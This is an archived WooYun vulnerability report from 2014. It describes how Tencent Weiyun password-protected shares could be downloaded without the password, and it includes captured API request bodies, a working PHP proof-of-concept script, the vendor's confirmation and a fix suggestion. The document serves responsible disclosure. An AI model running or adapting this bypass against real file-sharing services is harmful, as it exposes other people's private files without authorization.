{"id": 52371, "wybug_id": "wooyun-2014-071440", "wybug_title": "腾讯微云分享绕过密码直接下载", "wybug_corp": "腾讯", "wybug_author": "qwerty472123", "wybug_date": "2014-08-07 17:08", "wybug_open_date": "2014-09-21 17:10", "wybug_type": "未授权访问/权限绕过", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["未授权访问"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-21：\t细节向公众公开  简要描述： 闲的无聊看微云分享下载的时候意外发现密码可绕过 详细说明：  首先分享一个文件 获得链接 http://url.cn/VNW1B5 访问时直接跳到 http://share.weiyun.com/26ef1d114796fde0b5a32a9c1f90179f然后抓包在获取文件列表时 提交了密码{\"req_header\":{\"cmd\":12002,\"appid\":30111,\"version\":2,\"major_version\":2},\"req_body\":{\"ReqMsg_body\":{\"weiyun.WeiyunShareViewMsgReq_body\":{\"os_info\":\"windows\",\"browser\":\"chrome\",\"share_key\":\"26ef1d114796fde0b5a32a9c1f90179f\",\"share_pwd\":\"uF06\"}}}}但无Cookie存入 然后点击下载{\"req_header\":{\"cmd\":12003,\"appid\":30111,\"version\":2,\"major_version\":2},\"req_body\":{\"ReqMsg_body\":{\"weiyun.WeiyunShareDownloadMsgReq_body\":{\"share_key\":\"26ef1d114796fde0b5a32a9c1f90179f\",\"pack_name\":\"pack.txt\"}}}}发现竟然没有发送密码 刚才也没有Cookie存入然后嘛 测试了一下 pack_name是否可以任意竟然的确可以 也就是说 除了下载是什么名称不知道 内容完全可以直接下载简单写了个php做测试 程序中用 $_GET['url'] 传入分享的url（由于获取不了名称 直接把\"pack_name\"改为Unknow）\n<?php$a=str_replace(array('http://','share.weiyun.com/','url.cn/'),'',$_GET['url']);if(strlen($a)<=10){$ch=curl_init('http://url.cn/'.$a);curl_setopt($ch,CURLOPT_HEADER,1);curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);$b=curl_exec($ch);curl_close($ch);preg_match('/^Location: (.*?)\\r\\n/m',$b,$m);$a=substr($m[1],24);}$ch=curl_init('http://web2.cgi.weiyun.com/outlink.fcg?cmd=12003&g_tk=&data=%7B%22req_header%22%3A%7B%22cmd%22%3A12003%2C%22appid%22%3A30111%2C%22version%22%3A2%2C%22major_version%22%3A2%7D%2C%22req_body%22%3A%7B%22ReqMsg_body%22%3A%7B%22weiyun.WeiyunShareDownloadMsgReq_body%22%3A%7B%22share_key%22%3A%22'.$a.'%22%2C%22pack_name%22%3A%22Unknow%22%7D%7D%7D%7D');curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);$b=curl_exec($ch);curl_close($ch);preg_match('/\"download_url\": \"(.*?)\"/m',$b,$m);header('Location: '.$m[1]);\n然后 内容一览无余...   漏洞证明：  先上传一个文件 内容乱打的不要在意\n\n然后就分享文件\n\n用上文中的php程序无密码直接下载\n\n下载后内容一致\n\n   修复方案：  在下载时同样要提交密码 等等   版权声明：转载请注明来源 qwerty472123@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2014-08-07 18:49 厂商回复： 非常感谢您的报告，问题已着手处理，感谢大家对腾讯业务安全的关注。如果您有任何疑问，欢迎反馈，我们会有专人跟进处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-08-08 03:30 |    \t\t汪哥 \t\t\t( 路人 |\t\t\t        Rank:28 漏洞数:6        )\t\t \n  我靠再也不用微云了    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}